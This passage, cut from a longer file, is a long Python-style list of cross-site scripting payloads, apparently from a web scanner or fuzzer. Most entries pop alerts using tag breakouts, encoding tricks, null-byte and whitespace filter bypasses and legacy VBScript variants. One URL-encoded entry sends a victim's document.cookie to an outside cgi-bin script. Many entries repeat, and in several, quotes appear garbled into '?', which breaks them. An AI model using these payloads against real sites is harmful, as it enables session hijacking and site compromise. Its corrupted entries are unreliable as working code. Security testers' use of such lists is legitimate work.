             '<IMG SRC=# onmouseover="alert(\'X\')">', '"><IMG SRC=# onmouseover="alert(\'X\')">',
             '\'><IMG SRC=# onmouseover="alert(\'X\')">',
             '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
             '"><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
             "'><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
             '<IMG SRC="jav&#x0A;ascript:alert(\'X\');">', '"><IMG SRC="jav&#x0A;ascript:alert(\'X\');">',
             '\'><IMG SRC="jav&#x0A;ascript:alert(\'X\');">',
             'exp/*<A STYLE=\'no\\X:noX("*//*");X:ex/*X*//*/*/pression(alert("X"))\'>',
             '\'"--></style></script><script>alert("X")</script>', '\'"--></style></script><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '"></script><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', "'></script><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '&\'"><script>alert(/X/)</script>',
             '</ScrIpt><script>alert(/X/)</script>', '"><script>alert(/X/)</script>',
             '</ScrIpt><script>alert(/X/)</script>', "'><script>alert(/X/)</script>",
             '</ScrIpt><script>alert(/X/)</script>', "%26'%22%3E%3Cscript%3Ealert(%2FX%2F)%3C%2Fscript%3E%3D",
             '&\'">PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4', '&\'">/\'-C<FEP=#YA;&5R="@O>\'-S+RD\\+W-C<FEP=#.',
             '&\'">\\u{3c}\\u{73}\\u{63}\\u{72}\\u{69}\\u{70}\\u{74}\\u{3e}\\u{61}\\u{6c}\\u{65}\\u{72}\\u{74}\\u{28}\\u{2f}\\u{78}\\u{73}\\u{73}\\u{2f}\\u{29}\\u{3c}\\u{2f}\\u{73}\\u{63}\\u{72}\\u{69}\\u{70}\\u{74}\\u{3e}',
             '&\'">\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u002f\\u0078\\u0073\\u0073\\u002f\\u0029\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e',
             '&\'">0x3c7363726970743e616c657274282f7873732f293c2f7363726970743e',
             '&\'">-1,54,38,53,44,51,55,-1,36,47,40,53,55,-1,-1,59,54,54,-1,-1,-1,-1,54,38,53,44,51,55,-1',
             '&\'">PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
             '&\'">3e7470697263732f3c292f7373782f287472656c613e7470697263733c',
             '&\'">chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62).chr(97).chr(108).chr(101).chr(114).chr(116).chr(40).chr(47).chr(120).chr(115).chr(115).chr(47).chr(41).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62)',
             '&\'">TypeError: Cannot read property \'$content$\' of undefined',
             '&\'">\\74\\163\\143\\162\\151\\160\\164\\76\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51\\74\\57\\163\\143\\162\\151\\160\\164\\76',
             '&\'"><script>alert(/X/)</???>',
             '&\'">%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003e%u0061%u006c%u0065%u0072%u0074%u0028%u002f%u0078%u0073%u0073%u002f%u0029%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e',
             '&\'">\\uff1c\\uff53\\uff43\\uff52\\uff49\\uff50\\uff54\\uff1e\\uff41\\uff4c\\uff45\\uff52\\uff54\\uff08\\uff0f\\uff58\\uff53\\uff53\\uff0f\\uff09\\uff1c\\uff0f\\uff53\\uff43\\uff52\\uff49\\uff50\\uff54\\uff1e',
             '&\'">&lt;script&gt;alert&lpar;&sol;X&sol;&rpar;&lt;&sol;script&gt;',
             '&\'">&lt;script&gt;alert(/X/)&lt;/script&gt;', '&\'">Description:Syntax error Msg:Unexpected token < )',
             '</script><svg onload=\'-/"/-alert(1)//\'>', '"></script><svg onload=\'-/"/-alert(1)//\'>',
             '\'></script><svg onload=\'-/"/-alert(1)//\'>', '<!-- --!><script>alert(X)</script>-->',
             '"><!-- --!><script>alert(X)</script>-->', "'><!-- --!><script>alert(X)</script>-->",
             '<![CDATA[<script>alert(X)</script>]]>', '"><![CDATA[<script>alert(X)</script>]]>',
             "'><![CDATA[<script>alert(X)</script>]]>", '[data "1<div style=width:expression(prompt(1))>"]',
             '+onerror=alert(1)%3E/', '+onerror=prompt(1)%3E/',
             '?variable=%22%3e%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%77%77%77%2e%63%67%69%73%65%63%75%72%69%74%79 %2e%63%6f%6d%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%2e%63%67%69%3f%27%20%2b%64%6f%63% 75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e',
             '?#?gad=xxxx"onload="alert(1)"', '#?gad=xxxx"onload="alert(1)"', '/#?gad=xxxx"onload="alert(1)"',
             '?><script >alert(1)</script >', '?><ScRiPt>alert(1)</ScRiPt>', '?%3e%3cscript%3ealert(1)%3c/script%3e',
             '?><scr<script>ipt>alert(1)</scr</script>ipt>', '"><scr<script>ipt>alert(1)</scr</script>ipt>',
             "'><scr<script>ipt>alert(1)</scr</script>ipt>", '%00?><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>', '<xml onreadystatechange=alert(1)>',
             '"><xml onreadystatechange=alert(1)>', "'><xml onreadystatechange=alert(1)>",
             '<style onreadystatechange=alert(1)>', '"><style onreadystatechange=alert(1)>',
             "'><style onreadystatechange=alert(1)>", '<iframe onreadystatechange=alert(1)>',
             '"><iframe onreadystatechange=alert(1)>', "'><iframe onreadystatechange=alert(1)>",
             '<object onerror=alert(1)>', '"><object onerror=alert(1)>', "'><object onerror=alert(1)>",
             '<object type=image src=X.gif onreadystatechange=alert(1)></object>',
             '"><object type=image src=X.gif onreadystatechange=alert(1)></object>',
             "'><object type=image src=X.gif onreadystatechange=alert(1)></object>",
             '<img type=image src=X.gif onreadystatechange=alert(1)>',
             '"><img type=image src=X.gif onreadystatechange=alert(1)>',
             "'><img type=image src=X.gif onreadystatechange=alert(1)>",
             '<input type=image src=X.gif onreadystatechange=alert(1)>',
             '"><input type=image src=X.gif onreadystatechange=alert(1)>',
             "'><input type=image src=X.gif onreadystatechange=alert(1)>",
             '<isindex type=image src=X.gif onreadystatechange=alert(1)>',
             '"><isindex type=image src=X.gif onreadystatechange=alert(1)>',
             "'><isindex type=image src=X.gif onreadystatechange=alert(1)>", '<script onreadystatechange=alert(1)>',
             '"><script onreadystatechange=alert(1)>', "'><script onreadystatechange=alert(1)>",
             '<bgsound onpropertychange=alert(1)>', '"><bgsound onpropertychange=alert(1)>',
             "'><bgsound onpropertychange=alert(1)>", '<body onbeforeactivate=alert(1)>',
             '"><body onbeforeactivate=alert(1)>', "'><body onbeforeactivate=alert(1)>", '<body onactivate=alert(1)>',
             '"><body onactivate=alert(1)>', "'><body onactivate=alert(1)>", '<body onfocusin=alert(1)>',
             '"><body onfocusin=alert(1)>', "'><body onfocusin=alert(1)>",
             '<input onblur=alert(1) autofocus><input autofocus>',
             '"><input onblur=alert(1) autofocus><input autofocus>',
             "'><input onblur=alert(1) autofocus><input autofocus>",
             '<body onscroll=alert(1)><br><br>...<br><input autofocus>',
             '"><body onscroll=alert(1)><br><br>...<br><input autofocus>',
             "'><body onscroll=alert(1)><br><br>...<br><input autofocus>", '</a onmousemove=alert(1)>',
             '"></a onmousemove=alert(1)>', "'></a onmousemove=alert(1)>", '<video src=1 onerror=alert(1)>',
             '"><video src=1 onerror=alert(1)>', "'><video src=1 onerror=alert(1)>", '<audio src=1 onerror=alert(1)>',
             '"><audio src=1 onerror=alert(1)>', "'><audio src=1 onerror=alert(1)>",
             '<object data=javascript:alert(1)>', '"><object data=javascript:alert(1)>',
             "'><object data=javascript:alert(1)>", '<iframe src=javascript:alert(1)>',
             '"><iframe src=javascript:alert(1)>', "'><iframe src=javascript:alert(1)>",
             '<embed src=javascript:alert(1)>', '"><embed src=javascript:alert(1)>',
             "'><embed src=javascript:alert(1)>", '<form id=test /><button form=test formaction=javascript:alert(1)>',
             '"><form id=test /><button form=test formaction=javascript:alert(1)>',
             "'><form id=test /><button form=test formaction=javascript:alert(1)>",
             '<event-source src=javascript:alert(1)>', '"><event-source src=javascript:alert(1)>',
             "'><event-source src=javascript:alert(1)>", '<x style=x:expression(alert(1))>',
             '"><x style=x:expression(alert(1))>', "'><x style=x:expression(alert(1))>",
             '<x style=behavior:url(#default#time2) onbegin=alert(1)>',
             '"><x style=behavior:url(#default#time2) onbegin=alert(1)>',
             "'><x style=behavior:url(#default#time2) onbegin=alert(1)>", '<iMg onerror=alert(1) src=a>',
             '"><iMg onerror=alert(1) src=a>', "'><iMg onerror=alert(1) src=a>", '<[%00]img onerror=alert(1) src=a>',
             '"><[%00]img onerror=alert(1) src=a>', "'><[%00]img onerror=alert(1) src=a>",
             '<i[%00]mg onerror=alert(1) src=a>', '"><i[%00]mg onerror=alert(1) src=a>',
             "'><i[%00]mg onerror=alert(1) src=a>", '<img/onerror=alert(1) src=a>', '"><img/onerror=alert(1) src=a>',
             "'><img/onerror=alert(1) src=a>", '<img[%09]onerror=alert(1) src=a>', '"><img[%09]onerror=alert(1) src=a>',
             "'><img[%09]onerror=alert(1) src=a>", '<img[%0d]onerror=alert(1) src=a>',
             '"><img[%0d]onerror=alert(1) src=a>', "'><img[%0d]onerror=alert(1) src=a>",
             '<img[%0a]onerror=alert(1) src=a>', '"><img[%0a]onerror=alert(1) src=a>',
             "'><img[%0a]onerror=alert(1) src=a>", '<img/?onerror=alert(1) src=a>', '"><img/?onerror=alert(1) src=a>',
             "'><img/?onerror=alert(1) src=a>", '"><img/?onerror=alert(1) src=a>', '"><img/?onerror=alert(1) src=a>',
             "'><img/?onerror=alert(1) src=a>", "'><img/?onerror=alert(1) src=a>", '"><img/?onerror=alert(1) src=a>',
             "'><img/?onerror=alert(1) src=a>", '<img/?onerror=alert(1) src=a>', '"><img/?onerror=alert(1) src=a>',
             "'><img/?onerror=alert(1) src=a>", '"><img/?onerror=alert(1) src=a>', '"><img/?onerror=alert(1) src=a>',
             "'><img/?onerror=alert(1) src=a>", "'><img/?onerror=alert(1) src=a>", '"><img/?onerror=alert(1) src=a>',
             "'><img/?onerror=alert(1) src=a>", '<img/anyjunk/onerror=alert(1) src=a>',
             '"><img/anyjunk/onerror=alert(1) src=a>', "'><img/anyjunk/onerror=alert(1) src=a>",
             '<img o[%00]nerror=alert(1) src=a>', '"><img o[%00]nerror=alert(1) src=a>',
             "'><img o[%00]nerror=alert(1) src=a>",
             '<i[%00]m[%00]g o[%00]ner[%00]r[%00]or[%00]=a[%00]ler[%00]t(1) sr[%00]c=[%00]a>',
             '"><i[%00]m[%00]g o[%00]ner[%00]r[%00]or[%00]=a[%00]ler[%00]t(1) sr[%00]c=[%00]a>',
             "'><i[%00]m[%00]g o[%00]ner[%00]r[%00]or[%00]=a[%00]ler[%00]t(1) sr[%00]c=[%00]a>",
             '<img onerror=?alert(1)?src=a>', '"><img onerror=?alert(1)?src=a>', "'><img onerror=?alert(1)?src=a>",
             '"><img onerror=?alert(1)?src=a>', '"><img onerror=?alert(1)?src=a>', "'><img onerror=?alert(1)?src=a>",
             "'><img onerror=?alert(1)?src=a>", '"><img onerror=?alert(1)?src=a>', "'><img onerror=?alert(1)?src=a>",
             '<img onerror=?alert(1)?src=a>', '"><img onerror=?alert(1)?src=a>', "'><img onerror=?alert(1)?src=a>",
             '"><img onerror=?alert(1)?src=a>', '"><img onerror=?alert(1)?src=a>', "'><img onerror=?alert(1)?src=a>",
             "'><img onerror=?alert(1)?src=a>", '"><img onerror=?alert(1)?src=a>', "'><img onerror=?alert(1)?src=a>",
             '<img onerror=`alert(1)`src=a>', '"><img onerror=`alert(1)`src=a>', "'><img onerror=`alert(1)`src=a>",
             '<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >',
             '"><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >',
             "'><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >", '<img onerror=a&#x06c;ert(1) src=a>',
             '"><img onerror=a&#x06c;ert(1) src=a>', "'><img onerror=a&#x06c;ert(1) src=a>",
             '<img onerror=a&#x006c;ert(1) src=a>', '"><img onerror=a&#x006c;ert(1) src=a>',
             "'><img onerror=a&#x006c;ert(1) src=a>", '<img onerror=a&#x0006c;ert(1) src=a>',
             '"><img onerror=a&#x0006c;ert(1) src=a>', "'><img onerror=a&#x0006c;ert(1) src=a>",
             '<img onerror=a&#108;ert(1) src=a>', '"><img onerror=a&#108;ert(1) src=a>',
             "'><img onerror=a&#108;ert(1) src=a>", '<img onerror=a&#0108;ert(1) src=a>',
             '"><img onerror=a&#0108;ert(1) src=a>', "'><img onerror=a&#0108;ert(1) src=a>",
             '<img onerror=a&#108ert(1) src=a>', '"><img onerror=a&#108ert(1) src=a>',
             "'><img onerror=a&#108ert(1) src=a>", '<img onerror=a&#0108ert(1) src=a>',
             '"><img onerror=a&#0108ert(1) src=a>', "'><img onerror=a&#0108ert(1) src=a>",
             '%253cimg%20onerror=alert(1)%20src=a%253e', '%3cimg onerror=alert(1) src=a%3e',
             '<img onerror=alert(1) src=a>', '"><img onerror=alert(1) src=a>', "'><img onerror=alert(1) src=a>",
             '?img onerror=alert(1) src=a?', '<script>a\\u006cert(1);</script>',
             '</ScrIpt><script>a\\u006cert(1);</script>', '"><script>a\\u006cert(1);</script>',
             '</ScrIpt><script>a\\u006cert(1);</script>', "'><script>a\\u006cert(1);</script>",
             '</ScrIpt><script>a\\u006cert(1);</script>', '<script>eval(?a\\u006cert(1)?);</script>',
             '</ScrIpt><script>eval(?a\\u006cert(1)?);</script>', '"><script>eval(?a\\u006cert(1)?);</script>',
             '</ScrIpt><script>eval(?a\\u006cert(1)?);</script>', "'><script>eval(?a\\u006cert(1)?);</script>",
             '</ScrIpt><script>eval(?a\\u006cert(1)?);</script>', '<script>eval(?a\\x6cert(1)?);</script>',
             '</ScrIpt><script>eval(?a\\x6cert(1)?);</script>', '"><script>eval(?a\\x6cert(1)?);</script>',
             '</ScrIpt><script>eval(?a\\x6cert(1)?);</script>', "'><script>eval(?a\\x6cert(1)?);</script>",
             '</ScrIpt><script>eval(?a\\x6cert(1)?);</script>', '<script>eval(?a\\154ert(1)?);</script>',
             '</ScrIpt><script>eval(?a\\154ert(1)?);</script>', '"><script>eval(?a\\154ert(1)?);</script>',
             '</ScrIpt><script>eval(?a\\154ert(1)?);</script>', "'><script>eval(?a\\154ert(1)?);</script>",
             '</ScrIpt><script>eval(?a\\154ert(1)?);</script>', '<script>eval(?a\\l\\ert\\(1\\)?);</script>',
             '</ScrIpt><script>eval(?a\\l\\ert\\(1\\)?);</script>', '"><script>eval(?a\\l\\ert\\(1\\)?);</script>',
             '</ScrIpt><script>eval(?a\\l\\ert\\(1\\)?);</script>', "'><script>eval(?a\\l\\ert\\(1\\)?);</script>",
             '</ScrIpt><script>eval(?a\\l\\ert\\(1\\)?);</script>', '<script>eval(?al?+?ert(1)?);</script>',
             '</ScrIpt><script>eval(?al?+?ert(1)?);</script>', '"><script>eval(?al?+?ert(1)?);</script>',
             '</ScrIpt><script>eval(?al?+?ert(1)?);</script>', "'><script>eval(?al?+?ert(1)?);</script>",
             '</ScrIpt><script>eval(?al?+?ert(1)?);</script>', '<script>eval(String.fromCharCode(75,67,70));</script>',
             '</ScrIpt><script>eval(String.fromCharCode(75,67,70));</script>',
             '"><script>eval(String.fromCharCode(75,67,70));</script>',
             '</ScrIpt><script>eval(String.fromCharCode(75,67,70));</script>',
             "'><script>eval(String.fromCharCode(75,67,70));</script>",
             '</ScrIpt><script>eval(String.fromCharCode(75,67,70));</script>',
             '<script>eval(atob(?amF2YXNjcmlwdDphbGVydCgxKQ?));</script>',
             '</ScrIpt><script>eval(atob(?amF2YXNjcmlwdDphbGVydCgxKQ?));</script>',
             '"><script>eval(atob(?amF2YXNjcmlwdDphbGVydCgxKQ?));</script>',
             '</ScrIpt><script>eval(atob(?amF2YXNjcmlwdDphbGVydCgxKQ?));</script>',
             "'><script>eval(atob(?amF2YXNjcmlwdDphbGVydCgxKQ?));</script>",
             '</ScrIpt><script>eval(atob(?amF2YXNjcmlwdDphbGVydCgxKQ?));</script>',
             '<script>?alert(1)?.replace(/.+/,eval)</script>',
             '</ScrIpt><script>?alert(1)?.replace(/.+/,eval)</script>',
             '"><script>?alert(1)?.replace(/.+/,eval)</script>',
             '</ScrIpt><script>?alert(1)?.replace(/.+/,eval)</script>',
             "'><script>?alert(1)?.replace(/.+/,eval)</script>",
             '</ScrIpt><script>?alert(1)?.replace(/.+/,eval)</script>', '<script>function::[?alert?](1)</script>',
             '</ScrIpt><script>function::[?alert?](1)</script>', '"><script>function::[?alert?](1)</script>',
             '</ScrIpt><script>function::[?alert?](1)</script>', "'><script>function::[?alert?](1)</script>",
             '</ScrIpt><script>function::[?alert?](1)</script>',
             '<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>',
             '"><img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>',
             "'><img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>",
             '<script language=vbs>MsgBox 1</script>', '"><script language=vbs>MsgBox 1</script>',
             "'><script language=vbs>MsgBox 1</script>", '<img onerror=?vbs:MsgBox 1? src=a>',
             '"><img onerror=?vbs:MsgBox 1? src=a>', "'><img onerror=?vbs:MsgBox 1? src=a>",
             '<img onerror=MsgBox+1 language=vbs src=a>', '"><img onerror=MsgBox+1 language=vbs src=a>',
             "'><img onerror=MsgBox+1 language=vbs src=a>", '<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>',
             '"><SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>', "'><SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>",
             '<IMG ONERROR=?VBS:MSGBOX 1? SRC=A>', '"><IMG ONERROR=?VBS:MSGBOX 1? SRC=A>',
             "'><IMG ONERROR=?VBS:MSGBOX 1? SRC=A>", '<script>execScript(?MsgBox 1?,?vbscript?);</script>',
             '</ScrIpt><script>execScript(?MsgBox 1?,?vbscript?);</script>',
             '"><script>execScript(?MsgBox 1?,?vbscript?);</script>',
             '</ScrIpt><script>execScript(?MsgBox 1?,?vbscript?);</script>',
             "'><script>execScript(?MsgBox 1?,?vbscript?);</script>",
             '</ScrIpt><script>execScript(?MsgBox 1?,?vbscript?);</script>',
             '<script language=vbs>execScript(?alert(1)?)</script>',
             '"><script language=vbs>execScript(?alert(1)?)</script>',
             "'><script language=vbs>execScript(?alert(1)?)</script>",
             '<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(?ALERT(1)?)) </SCRIPT>',
             '"><SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(?ALERT(1)?)) </SCRIPT>',
             "'><SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(?ALERT(1)?)) </SCRIPT>",
             '<IMG ONERROR=?VBS:EXECSCRIPT LCASE(?ALERT(1)?)? SRC=A>',
             '"><IMG ONERROR=?VBS:EXECSCRIPT LCASE(?ALERT(1)?)? SRC=A>',
             "'><IMG ONERROR=?VBS:EXECSCRIPT LCASE(?ALERT(1)?)? SRC=A>",
             '<img onerror=?VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@? src=a>',
             '"><img onerror=?VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@? src=a>',
             "'><img onerror=?VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@? src=a>",
             '<img language=?JScript.Encode? onerror=?#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@? src=a>',
             '"><img language=?JScript.Encode? onerror=?#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@? src=a>',
             "'><img language=?JScript.Encode? onerror=?#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@? src=a>",
             '<script>var a = ?</script><script>alert(1)</script>',
             '</ScrIpt><script>var a = ?</script><script>alert(1)</script>',
             '"><script>var a = ?</script><script>alert(1)</script>',
             '</ScrIpt><script>var a = ?</script><script>alert(1)</script>',
             "'><script>var a = ?</script><script>alert(1)</script>",
             '</ScrIpt><script>var a = ?</script><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>', '<scr%00ipt%20&message=> alert(?X?)</script>',
             '"><scr%00ipt%20&message=> alert(?X?)</script>', "'><scr%00ipt%20&message=> alert(?X?)</script>",
             '?<script>prompt(1)</script>', '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '?;alert(1)//', '?-alert(1)-?', '?<script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>', '?;prompt(1)//', '?-prompt(1)-?',
             '<input type="text" AUTOFOCUS onfocus=alert(1)>', '"><input type="text" AUTOFOCUS onfocus=alert(1)>',
             '\'><input type="text" AUTOFOCUS onfocus=alert(1)>',
             '<script\\x20type="text/javascript">javascript:alert(1);</script>',
             '"><script\\x20type="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x20type="text/javascript">javascript:alert(1);</script>',
             '<script\\x3Etype="text/javascript">javascript:alert(1);</script>',
             '"><script\\x3Etype="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x3Etype="text/javascript">javascript:alert(1);</script>',
             '<script\\x0Dtype="text/javascript">javascript:alert(1);</script>',
             '"><script\\x0Dtype="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x0Dtype="text/javascript">javascript:alert(1);</script>',
             '<script\\x09type="text/javascript">javascript:alert(1);</script>',
             '"><script\\x09type="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x09type="text/javascript">javascript:alert(1);</script>',
             '<script\\x0Ctype="text/javascript">javascript:alert(1);</script>',
             '"><script\\x0Ctype="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x0Ctype="text/javascript">javascript:alert(1);</script>',
             '<script\\x2Ftype="text/javascript">javascript:alert(1);</script>',
             '"><script\\x2Ftype="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x2Ftype="text/javascript">javascript:alert(1);</script>',
             '<script\\x0Atype="text/javascript">javascript:alert(1);</script>',
             '"><script\\x0Atype="text/javascript">javascript:alert(1);</script>',
             '\'><script\\x0Atype="text/javascript">javascript:alert(1);</script>',
             '\'`"><\\x00script>javascript:alert(1)</script>', '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
             '"><img src=1 href=1 onerror="javascript:alert(1)"></img>',
             '\'><img src=1 href=1 onerror="javascript:alert(1)"></img>',
             '<audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
             '"><audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
             '\'><audio src=1 href=1 onerror="javascript:alert(1)"></audio>',
             '<video src=1 href=1 onerror="javascript:alert(1)"></video>',
             '"><video src=1 href=1 onerror="javascript:alert(1)"></video>',
             '\'><video src=1 href=1 onerror="javascript:alert(1)"></video>',
             '<body src=1 href=1 onerror="javascript:alert(1)"></body>',
             '"><body src=1 href=1 onerror="javascript:alert(1)"></body>',
             '\'><body src=1 href=1 onerror="javascript:alert(1)"></body>',
             '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
             '"><image src=1 href=1 onerror="javascript:alert(1)"></image>',
             '\'><image src=1 href=1 onerror="javascript:alert(1)"></image>',
             '<object src=1 href=1 onerror="javascript:alert(1)"></object>',
             '"><object src=1 href=1 onerror="javascript:alert(1)"></object>',
             '\'><object src=1 href=1 onerror="javascript:alert(1)"></object>',
             '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
             '"><script src=1 href=1 onerror="javascript:alert(1)"></script>',
             '\'><script src=1 href=1 onerror="javascript:alert(1)"></script>',
             '<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
             '"><svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
             '\'><svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>',
             '<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
             '"><title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
             '\'><title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>',
             '<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
             '"><iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
             '\'><iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>',
             '<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
             '"><body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
             '\'><body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>',
             '<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
             '"><body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
             '\'><body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>',
             '<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>',
             '"><frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>',
             '\'><frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>',
             '<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
             '"><script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
             '\'><script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>',
             '<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
             '"><html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
             '\'><html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>',
             '<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
             '"><body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
             '\'><body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>',
             '<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
             '"><svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
             '\'><svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>',
             '<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
             '"><body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
             '\'><body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>',
             '<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
             '"><body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
             '\'><body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>',
             '<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
             '"><body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
             '\'><body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>',
             '<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
             '"><body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
             '\'><body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>',
             '<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>',
             '"><bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>',
             '\'><bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>',
             '<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>',
